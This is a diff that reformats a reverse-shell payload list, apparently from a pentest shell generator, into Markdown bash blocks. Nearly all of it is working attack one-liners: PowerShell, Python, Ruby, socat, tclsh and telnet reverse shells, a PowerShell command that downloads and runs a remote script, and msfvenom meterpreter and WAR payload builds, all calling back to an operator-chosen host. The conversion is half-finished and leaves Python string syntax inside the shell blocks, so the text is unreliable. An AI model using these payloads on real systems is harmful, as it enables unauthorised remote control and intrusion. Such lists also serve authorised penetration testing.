@@ -125,17 +125,57 @@ php -r \'$s=fsockopen("%s",%d);system("/bin/sh -i <&3 >&3 2>&3");\'' % (ipaddr, 
 php -r \'$s=fsockopen("%s",%d);popen("/bin/sh -i <&3 >&3 2>&3", "r");\'' % (ipaddr, port),
 ```
 
-'ps-tcp':'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"%s\",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' % (ipaddr, port),
-        'ps-iex':'powershell IEX (New-Object Net.WebClient).DownloadString("http://%s:%d/revshell.ps1") \n\nMake a revshell.ps1 file and put it on your server!' % (ipaddr, port),
-        'ps-b64':'powershell -e '+ b64encode(('$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' % (ipaddr, port)).encode('utf16')[2:]).decode(),
-        'python':'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'' % (ipaddr, port),
-        'python-2':'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")\'' % (ipaddr, port),
-        'ruby':'ruby -rsocket -e\'f=TCPSocket.open(\"%s\",%d).to_i;exec sprintf(\"/bin/sh -i <&3 >&3 2>&3\",f,f,f)\'' % (ipaddr, port),
-        'ruby-2':'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("%s","%d");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'' % (ipaddr, port),
-        'ruby-windows':'ruby -rsocket -e \'c=TCPSocket.new("%s","%d");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'' % (ipaddr, port),
+```bash
+# Powershell - TCP
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"%s\",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' % (ipaddr, port),
+```
+
+```bash
+# Powershell - IEX
+powershell IEX (New-Object Net.WebClient).DownloadString("http://%s:%d/revshell.ps1") \n\nMake a revshell.ps1 file and put it on your server!' % (ipaddr, port),
+```      
+
+```bash
+'ps-b64':'powershell -e '+ b64encode(('$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' % (ipaddr, port)).encode('utf16')[2:]).decode(),
+```
+
+```bash
+# Python
+python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'' % (ipaddr, port),
+```
+
+
+```bash
+# Python 2
+python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")\'' % (ipaddr, port),
+```        
+
+```bash
+# Ruby
+ruby -rsocket -e\'f=TCPSocket.open(\"%s\",%d).to_i;exec sprintf(\"/bin/sh -i <&3 >&3 2>&3\",f,f,f)\'' % (ipaddr, port),
+```
+
+```bash
+Ruby 2
+ruby -rsocket -e \'exit if fork;c=TCPSocket.new("%s","%d");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'' % (ipaddr, port),
+```       
+        
+```bash        
+# Ruby - Windows
+ruby -rsocket -e \'c=TCPSocket.new("%s","%d");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'' % (ipaddr, port),
         'socat':'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:%s:%d \n\n[+] Catch incoming shell with:\n\nsocat file:`tty`,raw,echo=0 tcp-listen:%d' % (ipaddr, port, port),
-        'tclsh':'echo \'set s [socket %s %d];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;\' | tclsh' % (ipaddr, port),
-        'telnet':'rm -f /tmp/p; mknod /tmp/p p && telnet %s %d 0/tmp/p' % (ipaddr, port),
+```        
+ 
+ ```bash
+ # Tclsh
+ 'echo \'set s [socket %s %d];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;\' | tclsh' % (ipaddr, port),
+```
+
+```bash
+# Telnet
+'rm -f /tmp/p; mknod /tmp/p p && telnet %s %d 0/tmp/p' % (ipaddr, port),
+
+
         'telnet-mkfifo':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet %s %d > /tmp/f' % (ipaddr, port),
         'war':'msfvenom -p java/shell_reverse_tcp LHOST=%s LPORT=%d -f war -o revshell.war' % (ipaddr, port),
         'win-bin':'msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f exe > revshell.exe' % (ipaddr, port),
